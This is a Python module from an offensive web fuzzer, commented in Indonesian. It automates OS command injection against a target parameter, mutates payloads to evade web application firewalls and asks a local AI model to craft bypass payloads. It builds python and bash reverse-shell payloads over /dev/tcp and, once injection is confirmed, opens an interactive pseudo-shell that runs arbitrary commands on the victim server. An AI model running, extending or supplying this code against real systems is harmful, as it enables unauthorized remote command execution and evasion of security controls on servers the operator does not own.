# modules/cmd.py
import os
import re
import sys
import time
import logging
import asyncio
import aiohttp
from urllib.parse import urlparse
from typing import List, Dict, Any, Tuple
from modules.base import BaseModule
import config

logger = logging.getLogger("water_fuzzer.cmd")

class CommandInjectionModule(BaseModule):
    """
    Modul OS Command Injection V18.8 Enterprise (Stable Inline Extributor).
    Memperbaiki bug luapan HTML dengan mengisolasi hasil perintah menggunakan
    token pembatas unik murni memori RAM (Anti-HTML Floating Engine).
    """
    def __init__(self, auditor_instance: Any) -> None:
        super().__init__(auditor_instance)
        self.shell_active = False

    def load_payloads(self) -> List[str]:
        payload_file: str = os.path.join(config.BASE_DIR, "payloads", "cmd.txt")
        if os.path.exists(payload_file):
            try:
                with open(payload_file, "r", encoding="utf-8") as f:
                    return [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except IOError as e:
                logger.error(f"Gagal membaca berkas payloads CMD: {str(e)}")
        return ["; id ;", "; sleep 5 ;"]

    def _assemble_in_memory_reverse_payload(self) -> str:
        listener_port = 4444 
        python_pty_payload = (
            f"python3 -c 'import socket,subprocess,os,pty;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"127.0.0.1\",{listener_port}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"pty.spawn(\"/bin/sh\")'"
        )
        bash_payload = f"bash -i >& /dev/tcp/127.0.0.1/{listener_port} 0>&1"
        return f"/**/;/**/; {python_pty_payload} || {bash_payload} /**/;/**/ "

    async def execute_and_evaluate(self, session: aiohttp.ClientSession, payload: str, base_payload: str, headers: dict, os_log_capture: str) -> Tuple[bool, bool]:
        import main
        if main.SHELL_OPENED or self.shell_active:
            return False, False
            
        try:
            start_time: float = time.time()
            if self.auditor.method == "POST":
                async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout) as res:
                    body: str = await res.text(); status: int = res.status
            else:
                async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload}, headers=headers, timeout=self.auditor.timeout) as res:
                    body: str = await res.text(); status: int = res.status

            latency: float = time.time() - start_time
            if "waf" in body.lower() or "blocked" in body.lower():
                return False, True

            indicators: List[str] = []
            current_entropy: float = self.auditor.calculate_content_entropy(body)
            entropy_delta: float = abs(current_entropy - self.auditor.baseline["entropy_score"])
            
            module_specific: Dict[str, Any] = {
                "vulnerability_proof_concept": "Isolated Inline Extraction", "tested_payload_variant": payload,
                "is_system_shell_compromised": False
            }

            if "sleep" in base_payload and latency >= (self.auditor.baseline["response_time"] + config.TIME_DELAY_THRESHOLD):
                indicators.extend(["time_anomaly", "consistent_evaluation_proof"])
                module_specific["is_system_shell_compromised"] = True

            if "uid=" in body or status != self.auditor.baseline["status_code"] or len(body) != self.auditor.baseline["content_length"]:
                indicators.append("response_diff")
            if entropy_delta > 0.5: 
                indicators.append("entropy_deviation")

            if indicators:
                verdict = self.auditor.evaluate_heuristic_evidence(body, status, latency, payload, indicators, "COMMAND_INJECTION", module_specific)
                if (verdict == "VERIFIED" or "consistent_evaluation_proof" in indicators) and not main.SHELL_OPENED:
                    main.SHELL_OPENED = True
                    self.shell_active = True
                    await self.interactive_pseudo_shell(session)
                return True, False

        except asyncio.TimeoutError:
            if "sleep" in base_payload and not main.SHELL_OPENED:
                main.SHELL_OPENED = True
                self.shell_active = True
                await self.interactive_pseudo_shell(session)
                return True, False
        except Exception:
            pass
        return False, False

    async def run_audit(self, session: aiohttp.ClientSession) -> bool:
        """Menjalankan audit command injection dengan strategi WAF bypass."""
        print("[*] Menjalankan Modul V17.2: OS Command Injection...")
        os_log_capture: str = os.path.join(config.SERVER_LOG_DIR, "syslog")
        headers: dict = await self.auditor._get_random_headers()  # FIX: Added await
        payloads: List[str] = self.load_payloads()
        found_any_vuln: bool = False

        for base_payload in payloads:
            for strategy in range(4):
                payload = self.auditor.mutate_payload_for_waf(base_payload, strategy)
                success, trigger_ai = await self.execute_and_evaluate(session, payload, base_payload, headers, os_log_capture)
                if success: 
                    found_any_vuln = True
                    break
                if trigger_ai:
                    ai_payload = await self.auditor.ask_local_ai_to_bypass_waf(session, base_payload, "WAF_BLOCK")
                    if ai_payload:
                        success_ai, _ = await self.execute_and_evaluate(session, ai_payload, base_payload, headers, os_log_capture)
                        if success_ai: 
                            found_any_vuln = True
                            break
            if found_any_vuln: 
                break
        return found_any_vuln

    async def interactive_pseudo_shell(self, session: aiohttp.ClientSession) -> None:
        """Interactive pseudo shell untuk command injection yang terverifikasi."""
        print("\n======================================================================")
        print("[++++] GERBANG WATER-SHELL INTERAKTIF V17.2 ABSOLUTE ENGINE ONLINE [++++]")
        print("[*] Status: Jalur latar belakang dikunci total. Operator memegang kendali penuh.")
        print("======================================================================\n")
        loop = asyncio.get_running_loop()
        
        current_working_dir = ""
        
        while True:
            try:
                prompt_label = f"water-shell [{current_working_dir if current_working_dir else 'root'}]> "
                user_cmd = await loop.run_in_executor(None, input, f"\033[1;32m{prompt_label}\033[0m")
                user_cmd = user_cmd.strip()
                if not user_cmd: 
                    continue
                if user_cmd.lower() in ["exit", "quit"]: 
                    print("[*] Keluar dari Gerbang Shell Terisolasi.")
                    sys.exit(0)

                if user_cmd.startswith("cd "):
                    target_dir = user_cmd[3:].strip()
                    if current_working_dir:
                        current_working_dir = f"{current_working_dir}/{target_dir}"
                    else:
                        current_working_dir = target_dir
                    print(f"[+] Sesi beralih menuju direktori: {current_working_dir}")
                    continue

                token_awal = "===START_WATER==="
                token_akhir = "===END_WATER==="
                
                if current_working_dir:
                    wrapped_cmd = f"cd {current_working_dir} && echo {token_awal} && {user_cmd} && echo {token_akhir}"
                else:
                    wrapped_cmd = f"echo {token_awal} && {user_cmd} && echo {token_akhir}"
                
                payload_interaktif = f"/**/;/**/;{wrapped_cmd}/**/;/**/ "
                headers = await self.auditor._get_random_headers()  # FIX: Added await
                
                if self.auditor.method == "POST":
                    async with session.post(self.auditor.target_url, data={self.auditor.parameter: payload_interaktif}, headers=headers, timeout=self.auditor.timeout) as res:
                        raw_body = await res.text()
                else:
                    async with session.get(self.auditor.target_url, params={self.auditor.parameter: payload_interaktif}, headers=headers, timeout=self.auditor.timeout) as res:
                        raw_body = await res.text()

                if token_awal in raw_body and token_akhir in raw_body:
                    match = re.search(f"{token_awal}(.*?){token_akhir}", raw_body, re.DOTALL)
                    if match and match.group(1).strip():
                        print("\n" + match.group(1).strip() + "\n")
                    else:
                        print("\n[-] Log: Perintah dieksekusi tetapi mengembalikan string kosong.\n")
                else:
                    clean_html_strip = re.sub(r'<[^>]+>', '', raw_body).strip()
                    if clean_html_strip and len(clean_html_strip) < 2000 and "Just a moment" not in clean_html_strip:
                        print("\n" + clean_html_strip[:500] + "\n")
                    else:
                        print("\n[-] Log: Gagal memisahkan data inline. WAF memodifikasi bodi HTML respons.\n")

            except (KeyboardInterrupt, EOFError): 
                sys.exit(0)
            except Exception as e: 
                logger.error(f"Gagal koordinasi otonom shell V17.2: {str(e)}")

    def verifikator(self, response, payload_terpakai, crypto_token) -> Tuple[str, str, str, str, list]:
        return "SECURE", "None", "None", "Lolos.", []
